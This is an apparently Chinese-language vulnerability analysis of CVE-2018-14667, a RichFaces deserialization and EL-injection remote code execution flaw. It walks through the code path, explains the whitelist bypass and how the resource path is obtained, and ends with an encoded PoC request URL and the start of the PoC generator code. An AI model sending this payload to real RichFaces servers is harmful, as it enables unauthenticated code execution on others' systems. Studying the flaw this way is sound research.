<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p><strong>poc在最后，没有耐心看的师傅自行提取</strong></p>
<h3 data-content="1" id="30a35e5074b81f9b9af8a18f53554580">Issue</h3>
<pre><code>Red Hat Product Security has been made aware of a remote code execution flaw in the Java RichFaces framework. The issue has been assigned CVE-2018-14667 and a Critical security impact.
An application that uses certain features in RichFaces could permit an unauthenticated user to send a specially-crafted object that contains a tainted expression, the evaluation of which triggers deserialization after clearing any whitelist protections. This can result in execution of arbitrary java code or possibly system code.</code></pre>
<h3 data-content="1" id="9eddd64f806685a6aef5361f04e70fb3">jsf介绍</h3>
<p>JSF(JavaServer Faces)它是一个基于服务器端组件的用户界面框架、事件驱动的框架。 它用于开发Web应用程序。 它提供了一个定义良好的编程模型，由丰富的API和标签库组成。最新版本JSF 2使用Facelets作为其默认模板系统。支持依赖注入、支持html5、内置Ajax支持。</p>
<p>对比st2，jsf可以将事件响应细化到表单中的字段处理（st2中，一个表单只能对应一个事件）</p>
<h3 data-content="1" id="e889019bc9b72ac30a5213dda3978111">触发流程（只取其中一个最简单的）</h3>
<div class="highlight"><pre><span></span><span class="n">BaseFilter</span><span class="err">#</span><span class="n">doFilter</span>
    <span class="n">InternetResourceService</span><span class="err">#</span><span class="n">serviceResource</span>
        <span class="n">ResourceBuilderImpl</span><span class="err">#</span><span class="n">getResourceForKey</span>
            <span class="n">ObjectInputStream</span><span class="err">#</span><span class="n">readObject</span>
        <span class="n">UserResource</span><span class="err">#</span><span class="n">getLastModified</span>
            <span class="n">ValueExpression</span><span class="err">#</span><span class="n">getValue</span>
</pre></div>
<h3 data-content="1" id="caf47818631aaf4513d7a9f04dba5a20">分析过程</h3>
<p><code>Local_env：Tomcat8.5.24、jdk1.8.144、richfaces-demo-3.3.0.GA-tomcat6.war</code></p>
<p>一个月前看apache的myfaces的时候，无意间就瞄到了richfaces的rce（RF-13977），看payload挺有意思的，不过没有细跟，正好这几天刚刚出了 cve-2018-14667 顺便学习下</p>
<p>这篇文章仅仅对触发流程和payload的构造进行阐述，不对el表达式的各种骚姿势做详细跟进。同时，为了文章阅读体验，我选择视角从Filter开始而不是官方描述中的UserResource这个地方开始</p>
<h4 data-content="1" id="3914b6ca412277a92cf743df753e5f1b">BaseFilter（入口）</h4>
<p>这个filter是richfaces的基础filter，但是没有看见它显式的加入web.xml中，web.xml只是配置了jboss.SeamFilter，在动态调试中发现，SeamFilter调用了Ajax4jsfFilter，然后Ajax4jsfFilter又调用到了BaseFilter<br/>
BaseFilter的dofilter关键代码如下:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200406-0e1ea472-e673-1.png"/></p>
<p>if条件不满足即可进入else if判断条件，其中会调用到InternetResourceService#serviceResource</p>
<h4 data-content="1" id="bf96d0781dcb9c3c7ca66fec4dc20982">InternetResourceService（漏洞核心处理逻辑）</h4>
<p>跟进如下(只贴关键代码)：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">serviceResource</span><span class="o">(</span><span class="n">String</span> <span class="n">resourceKey</span><span class="o">,</span> <span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span>
            <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">InternetResource</span> <span class="n">resource</span><span class="o">;</span><span class="c1">// getInternetResource(request);</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">resource</span> <span class="o">=</span> <span class="n">getResourceBuilder</span><span class="o">().</span><span class="na">getResourceForKey</span><span class="o">(</span><span class="n">resourceKey</span><span class="o">);</span>
<span class="o">[...]</span>
        <span class="n">Object</span> <span class="n">resourceDataForKey</span> <span class="o">=</span> <span class="n">getResourceBuilder</span><span class="o">().</span><span class="na">getResourceDataForKey</span><span class="o">(</span>
                <span class="n">resourceKey</span><span class="o">);</span>

        <span class="n">ResourceContext</span> <span class="n">resourceContext</span> <span class="o">=</span> <span class="n">getResourceContext</span><span class="o">(</span><span class="n">resource</span><span class="o">,</span> <span class="n">request</span><span class="o">,</span>
                <span class="n">response</span><span class="o">);</span>
        <span class="n">resourceContext</span><span class="o">.</span><span class="na">setResourceData</span><span class="o">(</span><span class="n">resourceDataForKey</span><span class="o">);</span>
        <span class="k">try</span> <span class="o">{</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">resource</span><span class="o">.</span><span class="na">isCacheable</span><span class="o">(</span><span class="n">resourceContext</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="o">.</span><span class="na">cacheEnabled</span><span class="o">)</span> <span class="o">{</span>
                <span class="c1">// Test for client request modification time.</span>
                <span class="k">try</span> <span class="o">{</span>
                    <span class="kt">long</span> <span class="n">ifModifiedSince</span> <span class="o">=</span> <span class="n">request</span>
                            <span class="o">.</span><span class="na">getDateHeader</span><span class="o">(</span><span class="s">"If-Modified-Since"</span><span class="o">);</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">ifModifiedSince</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                        <span class="c1">// Test for modification. 1000 ms due to round</span>
                        <span class="c1">// modification</span>
                        <span class="c1">// time to seconds.</span>
                        <span class="kt">long</span> <span class="n">lastModified</span> <span class="o">=</span> <span class="n">resource</span><span class="o">.</span><span class="na">getLastModified</span><span class="o">(</span>
                                <span class="n">resourceContext</span><span class="o">).</span><span class="na">getTime</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1000</span><span class="o">;</span>
<span class="o">[...]</span>
                    <span class="kt">long</span> <span class="n">expired</span> <span class="o">=</span> <span class="n">resource</span><span class="o">.</span><span class="na">getExpired</span><span class="o">(</span><span class="n">resourceContext</span><span class="o">);</span>
<span class="o">[...]</span> 
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="n">getLifecycle</span><span class="o">().</span><span class="na">send</span><span class="o">(</span><span class="n">resourceContext</span><span class="o">,</span> <span class="n">resource</span><span class="o">);</span>
<span class="o">[...]</span>
</pre></div>
<p>先说明一下大致代码逻辑，resourceKey 是从url中获取的，具体的规则不在这里展示，可以从后文中的payload里看见。<br/>
利用resourceKey提取resouce、resourceDataForKey，然后将resourceDataForKey放入resource上下文中存储，在后续流程中，通过某些判断，调用了 resource.getLastModified、resource.getExpired以及ResourceLifecycle#send<br/>
这里先对 ResourceLifecycle#send做一个阐述，首先要进入else代码块中才能调用它，resource.isCacheable(resourceContext)、 this.cacheEnabled 这两个判断条件，前者是服务端自行设置的值，后者默认为true，换句话说，服务端可以控制 ResourceLifecycle#send 的调用情况，在后续的跟进中（这里就补贴代码了），发现最终会调用 resource.send</p>
<p><strong>理一下，InternetResourceService#serviceResource 通过服务端的控制，分别可以调用到 resource.getLastModified、resource.getExpired 还有 resource.send</strong></p>
<h4 data-content="1" id="0b068b5022340f08bd56c949ba61739e">ResourceBuilderImpl（反序列化限制绕过）</h4>
<p>上文中可以看到，resource和resourceDataForKey都是由 ResourceBuilderImpl 生成的，我们先不看 resource，先跟踪 resourceDataForKey 的生成过程，如下图：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200441-229b00b2-e673-1.png"/></p>
<p>由图中流程大致可以猜到，程序将url中的字符串进行一个截断取值，将满足一定条件的字符串解密后进行反序列化操作，但是经过操作的类是 LookAheadObjectInputStream，该类重写了 resolveClass ，对反序列化进行白名单处理，如下图</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200452-294c2076-e673-1.png"/></p>
<p>whitelistClassNameCache 中都是一些基础类，而whitelistBaseClasses是从 resource-serialization.properties 中加载的，只要满足反序列化的类是其子类即可正常反序列化，否则抛出错误<br/>
resource-serialization.properties 内容如下图：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200500-2e33ae56-e673-1.png"/></p>
<p>官方通告描述中的 UserResource 恰好是 InternetResource 的子类，UserResource$UriData 也是 SerializableResource 的子类，所以满足反序列化的白名单限制</p>
<p>现在回过头看看解密过程，如下图：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200517-3869e890-e673-1.png"/></p>
<p>图中流程是先进行 decode 然后再进行解压缩操作，最后返回，跟进 decode 看看</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200524-3ca0a6e2-e673-1.png"/></p>
<p>进行了一次base64解密，同时如果 d 不为空就进行DES解密，不过呢在 ResourceBuilderImpl中 Codec 中的 d 是为 null 的....也就是说解密流程只有 base64解密 -&gt; zip解压缩。</p>
<p>此时此刻喜不自胜，总的来说反序列化是我们完全可控的内容，并且利用类 UserResource 也是在白名单中</p>
<h4 data-content="1" id="500f28a3f7b59ad80d7844ed22468792">ResourceBuilderImpl（服务器端生成资源，payload不可控？）</h4>
<p>那么现在去看一下 resource 是如何生成的，如下图：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200533-419ca97a-e673-1.png"/></p>
<p>对传入的url进行一个截断取值，带入getResource函数中，跟进如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200539-457b4e66-e673-1.png"/></p>
<p>从一个map中根据key值获取得到的 resource，那么看下哪些地方有填充map的</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200547-49e2afa8-e673-1.png"/></p>
<p>一眼就看见了 userResource ，跟过去看看</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200556-4fb5c1f4-e673-1.png"/></p>
<p>如上图，首先根据生成的path去获取userResource，获取不到的话就new一个，然后放入resources Map 中，在回溯这个 createUserResource 函数调用点的时候发现只有一个地方，在 MediaOutputRenderer#doEncodeBegin</p>
<p>大致浏览了下 MedaiOutputRenderer 中的逻辑，发现是对jsf的事件处理：对jsf标签的解析后的输出处理流程，可以将用户自定义类型进行一个解析并展示，在demo中可以找到使用方法</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200606-55713fec-e673-1.png"/></p>
<p>带有 jsf 标签界面文件源码如下：</p>
<pre><code>&lt;ui:composition xmlns="http://www.w3.org/1999/xhtml"
      xmlns:ui="http://java.sun.com/jsf/facelets"
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:f="http://java.sun.com/jsf/core"
      xmlns:a4j="http://richfaces.org/a4j"
      xmlns:rich="http://richfaces.org/rich"&gt;


    &lt;br/&gt;
    &lt;a4j:mediaOutput element="img" cacheable="false" session="true"
        createContent="#{mediaBean.paint}" value="#{mediaData}" mimeType="image/jpeg" /&gt;
    &lt;br/&gt;&lt;br/&gt;

&lt;/ui:composition&gt;</code></pre>
<p>Java代码如下：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MediaBean</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">paint</span><span class="o">(</span><span class="n">OutputStream</span> <span class="n">out</span><span class="o">,</span> <span class="n">Object</span> <span class="n">data</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">data</span> <span class="k">instanceof</span> <span class="n">MediaData</span><span class="o">)</span> <span class="o">{</span>            
        <span class="n">MediaData</span> <span class="n">paintData</span> <span class="o">=</span> <span class="o">(</span><span class="n">MediaData</span><span class="o">)</span> <span class="n">data</span><span class="o">;</span>
        <span class="n">BufferedImage</span> <span class="n">img</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedImage</span><span class="o">(</span><span class="n">paintData</span><span class="o">.</span><span class="na">getWidth</span><span class="o">(),</span><span class="n">paintData</span><span class="o">.</span><span class="na">getHeight</span><span class="o">(),</span><span class="n">BufferedImage</span><span class="o">.</span><span class="na">TYPE_INT_RGB</span><span class="o">);</span>
        <span class="n">Graphics2D</span> <span class="n">graphics2D</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="na">createGraphics</span><span class="o">();</span>
        <span class="n">graphics2D</span><span class="o">.</span><span class="na">setBackground</span><span class="o">(</span><span class="n">paintData</span><span class="o">.</span><span class="na">getBackground</span><span class="o">());</span>
        <span class="n">graphics2D</span><span class="o">.</span><span class="na">setColor</span><span class="o">(</span><span class="n">paintData</span><span class="o">.</span><span class="na">getDrawColor</span><span class="o">());</span>
        <span class="n">graphics2D</span><span class="o">.</span><span class="na">clearRect</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">paintData</span><span class="o">.</span><span class="na">getWidth</span><span class="o">(),</span><span class="n">paintData</span><span class="o">.</span><span class="na">getHeight</span><span class="o">());</span>
        <span class="n">graphics2D</span><span class="o">.</span><span class="na">drawLine</span><span class="o">(</span><span class="mi">5</span><span class="o">,</span><span class="mi">5</span><span class="o">,</span><span class="n">paintData</span><span class="o">.</span><span class="na">getWidth</span><span class="o">()-</span><span class="mi">5</span><span class="o">,</span><span class="n">paintData</span><span class="o">.</span><span class="na">getHeight</span><span class="o">()-</span><span class="mi">5</span><span class="o">);</span>
        <span class="n">graphics2D</span><span class="o">.</span><span class="na">drawChars</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">"RichFaces"</span><span class="o">).</span><span class="na">toCharArray</span><span class="o">(),</span><span class="mi">0</span><span class="o">,</span><span class="mi">9</span><span class="o">,</span><span class="mi">40</span><span class="o">,</span><span class="mi">15</span><span class="o">);</span>
        <span class="n">graphics2D</span><span class="o">.</span><span class="na">drawChars</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">"mediaOutput"</span><span class="o">).</span><span class="na">toCharArray</span><span class="o">(),</span><span class="mi">0</span><span class="o">,</span><span class="mi">11</span><span class="o">,</span><span class="mi">5</span><span class="o">,</span><span class="mi">45</span><span class="o">);</span>     
        <span class="n">ImageIO</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">img</span><span class="o">,</span><span class="s">"jpeg"</span><span class="o">,</span><span class="n">out</span><span class="o">);</span>        
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MediaData</span> <span class="kd">implements</span> <span class="n">Serializable</span><span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">1L</span><span class="o">;</span>
    <span class="n">Integer</span> <span class="n">Width</span><span class="o">=</span><span class="mi">110</span><span class="o">;</span>
    <span class="n">Integer</span> <span class="n">Height</span><span class="o">=</span><span class="mi">50</span><span class="o">;</span>
    <span class="n">Color</span> <span class="n">Background</span><span class="o">=</span><span class="k">new</span> <span class="n">Color</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="mi">0</span><span class="o">);</span>
    <span class="n">Color</span> <span class="n">DrawColor</span><span class="o">=</span><span class="k">new</span> <span class="n">Color</span><span class="o">(</span><span class="mi">255</span><span class="o">,</span><span class="mi">255</span><span class="o">,</span><span class="mi">255</span><span class="o">);</span>
    <span class="kd">public</span> <span class="nf">MediaData</span><span class="o">()</span> <span class="o">{}</span>
    <span class="kd">public</span> <span class="n">Color</span> <span class="nf">getBackground</span><span class="o">()</span> <span class="o">{</span>        <span class="k">return</span> <span class="n">Background</span><span class="o">;</span>  <span class="o">}</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setBackground</span><span class="o">(</span><span class="n">Color</span> <span class="n">background</span><span class="o">)</span> <span class="o">{</span>        <span class="n">Background</span> <span class="o">=</span> <span class="n">background</span><span class="o">;</span>    <span class="o">}</span>
    <span class="kd">public</span> <span class="n">Color</span> <span class="nf">getDrawColor</span><span class="o">()</span> <span class="o">{</span>        <span class="k">return</span> <span class="n">DrawColor</span><span class="o">;</span>    <span class="o">}</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setDrawColor</span><span class="o">(</span><span class="n">Color</span> <span class="n">drawColor</span><span class="o">)</span> <span class="o">{</span>        <span class="n">DrawColor</span> <span class="o">=</span> <span class="n">drawColor</span><span class="o">;</span>    <span class="o">}</span>
    <span class="kd">public</span> <span class="n">Integer</span> <span class="nf">getHeight</span><span class="o">()</span> <span class="o">{</span>        <span class="k">return</span> <span class="n">Height</span><span class="o">;</span>    <span class="o">}</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setHeight</span><span class="o">(</span><span class="n">Integer</span> <span class="n">height</span><span class="o">)</span> <span class="o">{</span>        <span class="n">Height</span> <span class="o">=</span> <span class="n">height</span><span class="o">;</span>    <span class="o">}</span>
    <span class="kd">public</span> <span class="n">Integer</span> <span class="nf">getWidth</span><span class="o">()</span> <span class="o">{</span>        <span class="k">return</span> <span class="n">Width</span><span class="o">;</span>    <span class="o">}</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setWidth</span><span class="o">(</span><span class="n">Integer</span> <span class="n">width</span><span class="o">)</span> <span class="o">{</span>        <span class="n">Width</span> <span class="o">=</span> <span class="n">width</span><span class="o">;</span>    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>简单来说就是可以把用java代码实现的多媒体通过 <code>&lt;a4j:mediaOutput /&gt;</code> 这个标签进行自动填充到页面中，可以看见 createContent 和 value 都是 el 表达式构成</p>
<p>到这里，仔细想想那不是凉凉？？<br/>
首先这个 userResource 是服务器自动生成的，解析 el 表达式内容也是通过服务端的自定义的 mediaOutput 标签内容决定的，难道要上服务器去修改 mediaOutput 标签中的表达式，然后再去访问该页面才能触发漏洞吗，答案是否定的</p>
<h4 data-content="1" id="de4e680d4dbc6048653f54ef1c5643cb">MediaOutputRenderer（获取payload的第一步：path）</h4>
<p>因为前文中发现了只要知道一个服务端 userResource 的对应 path 就能获取到一个 userResource 资源实例，后续中我们可以通过URL控制反序列化的内容。</p>
<p>path 的生成过程如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200659-75368bca-e673-1.png"/></p>
<p>但是问题又来了，mime 是前文中 mediaOutput 标签中的 mimeType 字段指定的值，我又不晓得服务器里是指定的啥.....难道 path似乎需要爆破才能得到？答案也是否定的</p>
<p>仔细看 MediaOutputRenderer#doEncodeBegin 的处理流程，如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200710-7b62ee08-e673-1.png"/></p>
<p>注意标注部分，首先创建了 userResource，然后调用了 getUri ，将其返回字符串设置进了 ResponseWriter 中，那么页面上应该是可以拿到这么一个 URL 的，不过我们还是先看看 getUri 的处理流程</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200722-82deaa50-e673-1.png"/></p>
<p>调用到了 UserResource 的 getDataToStore ，跟进去先看看</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200735-8a8a68f2-e673-1.png"/></p>
<p>大致流程就是将 MediaOutputRenderer#doEncodeBegin 中的 component 参数（是由标签中的字段解析得到）中的一些设定值，提取出来，赋值到新建的 UriData 对象中，然后将此对象返回</p>
<p>那么继续跟进 ResourceBuilderImpl#getUri ，如下（关键代码）：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">String</span> <span class="nf">getUri</span><span class="o">(</span><span class="n">InternetResource</span> <span class="n">resource</span><span class="o">,</span> <span class="n">FacesContext</span> <span class="n">context</span><span class="o">,</span>
        <span class="n">Object</span> <span class="n">storeData</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">StringBuffer</span> <span class="n">uri</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span><span class="c1">// ResourceServlet.DEFAULT_SERVLET_PATH).append("/");</span>
    <span class="n">uri</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">resource</span><span class="o">.</span><span class="na">getKey</span><span class="o">());</span>
    <span class="c1">// append serialized data as Base-64 encoded request string.</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">storeData</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">objectData</span><span class="o">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">storeData</span> <span class="k">instanceof</span> <span class="kt">byte</span><span class="o">[])</span> <span class="o">{</span>
                <span class="n">objectData</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">[])</span> <span class="n">storeData</span><span class="o">;</span>
                <span class="n">uri</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">DATA_BYTES_SEPARATOR</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="n">ByteArrayOutputStream</span> <span class="n">dataSteram</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">(</span>
                        <span class="mi">1024</span><span class="o">);</span>
                <span class="n">ObjectOutputStream</span> <span class="n">objStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span>
                        <span class="n">dataSteram</span><span class="o">);</span>
                <span class="n">objStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">storeData</span><span class="o">);</span>
                <span class="n">objStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
                <span class="n">objStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                <span class="n">dataSteram</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                <span class="n">objectData</span> <span class="o">=</span> <span class="n">dataSteram</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
                <span class="n">uri</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">DATA_SEPARATOR</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">dataArray</span> <span class="o">=</span> <span class="n">encrypt</span><span class="o">(</span><span class="n">objectData</span><span class="o">);</span>
            <span class="n">uri</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">dataArray</span><span class="o">,</span> <span class="s">"ISO-8859-1"</span><span class="o">));</span>
<span class="o">[...]</span>
     <span class="o">}</span>
    <span class="kt">boolean</span> <span class="n">isGlobal</span> <span class="o">=</span> <span class="o">!</span><span class="n">resource</span><span class="o">.</span><span class="na">isSessionAware</span><span class="o">();</span>
    <span class="n">String</span> <span class="n">resourceURL</span> <span class="o">=</span> <span class="n">getWebXml</span><span class="o">(</span><span class="n">context</span><span class="o">).</span><span class="na">getFacesResourceURL</span><span class="o">(</span><span class="n">context</span><span class="o">,</span>
            <span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">(),</span> <span class="n">isGlobal</span><span class="o">);</span><span class="c1">// context.getApplication().getViewHandler().getResourceURL(context,uri.toString());</span>
<span class="o">[...]</span>
    <span class="k">return</span> <span class="n">resourceURL</span><span class="o">;</span><span class="c1">// context.getExternalContext().encodeResourceURL(resourceURL);</span>
<span class="o">}</span>
</pre></div>
<p>可以看见这个 storeData 其实就是我们的 UriData 对象，将其序列化后经过encrypt加入了返回的 resourceURL 中，这个就是我们的 payload 雏形</p>
<p>在浏览器里可以拿到 resourceURL 的值，如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200752-94af199a-e673-1.png"/></p>
<p>这样，只要有 mediaOutput 的标签，总是会返回一个 src ，其值就是服务端已经序列化好的多媒体数据，我们仅仅需要 <code>/DATA/</code> 的前半段就好，后半段由我们自己构造</p>
<h4 data-content="1" id="6e883da4276b8db149d3e3b3abb2b5f2">UserResource（java反序列化 + EL = RCE）</h4>
<p>到目前为止，我们仅仅知道，一个请求过去以后，会执行 resource.getLastModified、resource.getExpired 还有 resource.send，期间反序列化的数据我们也是可控的，那么怎么利用呢，现在开始进入触发点 UserResource</p>
<p>以上三个函数：getLastModified、getExpired、send 只需要挑其中一个看就好，流程大致相似</p>
<p>查看 getExpired 代码如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200817-a3745b0c-e673-1.png"/></p>
<p>先调用 restoreData 返回一个 UriData 对象，将其 expires 成员经过一定处理后进行 el 表达式解析，跟踪一下 UriData 对象如何获取的，如下图：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200825-a852d4dc-e673-1.png"/></p>
<p>上图中的 deserializeData 返回的还是 objectArray 本身，就不贴图了，主要看 getResourceData</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200831-abed55ea-e673-1.png"/></p>
<p>赋值就是由 setResourceData 操作的，它就是在前文中提到的 InternetResourceService#serviceResource 中由 resourceDataForKey放入resource上下文中存储的值</p>
<p>至此，触发流程已经全部理清</p>
<h3 data-content="1" id="509c41f00a80d12baa5019f5edcf57f5">效果</h3>
<p>首先将发送给服务器的 UserRessource 请求拦截，然后换上我们自己的poc</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200911-c386300a-e673-1.png"/></p>
<p>发包，结果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181112200918-c7cf0704-e673-1.png"/></p>
<h3 data-content="1" id="5f6fecf49c5992c5ca7e33f8d7ad3143">总结</h3>
<p>上文中提到的 resource.isCacheable(resourceContext) 的返回值，是由 mediaOutput 中的 cacheable 字段设置，如果为 ture 会触发 getLastModified、getExpired，如果为 false 会触发 getLastModified、send</p>
<p>首先，服务器会根据其web程序中含有的脚本中的 mediaOutput 标签进行解析，创建出 UserResource 实例，并且配置一个path做一个map映射，最终path会返回给前端进行多媒体的展示<br/>
我们从前端拿到 path 后，自行构造 <code>/DATA/</code> 后面的反序列化内容<br/>
服务器拿到我们提交的 url 后，会将反序列化内容转换成 UriData 对象，并最终调用 UserResource 中的 getLastModified、getExpired、send 函数，这三个函数中，都对 UriData 中的数据进行提取，然后执行 EL 表达式解析操作，最终造成 RCE</p>
<p><strong>由此可见，只要是使用了 richfaces 3.x-3.3.4 依赖，并且使用了其 mediaOutput 标签的程序，都可以RCE</strong></p>
<p>不过稍微有一点限制的就是，javax.el.MethodExpression 的 serialVersionUID 问题，因为它自身没有给一个确定的值，所以在不同的容器中凸显的值就不一样，我借用了 RF-13977 中的 tomcat 对应的 serialVersionUID 。不过这个问题也是可以解决的，在触发流程分析过程中，getLastModified 这个触发点是稳定触发的，它也不需要 MethodExpression ，仅仅保留POC中的 modified 的生成过程就好了</p>
<h3 data-content="1" id="b6db4761a2d118845d49eddb86271d73">POC</h3>
<pre><code>/DATA/eAHFlc9PE0EUx4cqyg9!oBARjUldjRRjZsHgAbEJCRo1KZJQQIWDmW5f26mzP5idbTcSFA9evBhEb968wsmzEY3xYOKFv0APxhhjQky8GmdmSyuNeuDSnmZ3337fe5!v29eV76jZ5-i0y!OYFEk4WPRzmIPvBtwCPOUDn6hcnJzi9CIRBKlf57lvMbQzhfZaHIiAUdcR4AiBDqaKpERMRpy8OZ4pgiWGU2g3hB6VmnPoLmpKoRbbzdIchWzlurlEWAD6IvRkLaeURIhzxAIfW67tuY7UxmkhE11xWRZ4mpSA33z!Irn87MNYDMVSqNVixPevERu21pAWnDp5WUObL9!Jag2BDkVVUtdMA6eE0Tskw2A49FT6XpkS-4GjC2AgfAwMT5L8GIiCm70UerITn7qO5oBQ0x6EQo56oqJlaH3cXKq7febRp42YjuusxtWUnj94mP4xs35BRagKhpQZnFqFCEFAMfE8Ri0iZNqIQ32S61yGAMeJp!fPr0x81ky6MsSHyIRaLoGO6OZDE5g5rcDXnklMuzzCtZFHa1H1uYZD5VWLLDSuCi1mXF8zqlO7antsaHWh7cay6I0YHa72Xhdabluc!bj2a0kBUNqt5SeofGKew1wAvsB5EKPK3kRf9ZhyiZwDeYPJQ!TQUOpYTR6eCBxBbTB0fFR-wpAqtfvUKbm3IeEEjPVhCMFKGBZhltG38B8nPS-UTR!f0nQ9HNV1ZqP7Z!vrA2Oqa42qPN-4dlDAUeesdjOCU!kkVtenv3w9Nn9ZD52c5ZhAXZogdfF4ILxAyEAgtkAdNbDRNEkO5XforVkdUdOGLCXRWyaERDIA3yx6kE!rMw4Lwmbxkf4z!fGRgYGzA4NJY8viSDbIbCPUS2mHXjv!-O7rZvXPz16Z26EV9peX0L0GNRGHaL2ifdqoQFCG5aIGZdMbtLY9mwpyXd7KBU7SqKg33iJFu6dC-zFabBTtzX-vv-F-hV5uD3cx8EXS2JRuHGuBWpTzk3Lt!gZHm9YF.jsf</code></pre>
<p>poc生成代码</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">com.sun.facelets.el.TagMethodExpression</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.facelets.el.TagValueExpression</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.facelets.tag.Location</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.facelets.tag.TagAttribute</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.ajax4jsf.resource.UserResource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.ajax4jsf.util.base64.URL64Codec</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jboss.el.MethodExpressionImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jboss.el.ValueExpressionImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jboss.el.parser.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jboss.seam.core.Expressions</span><span class="o">;</span>
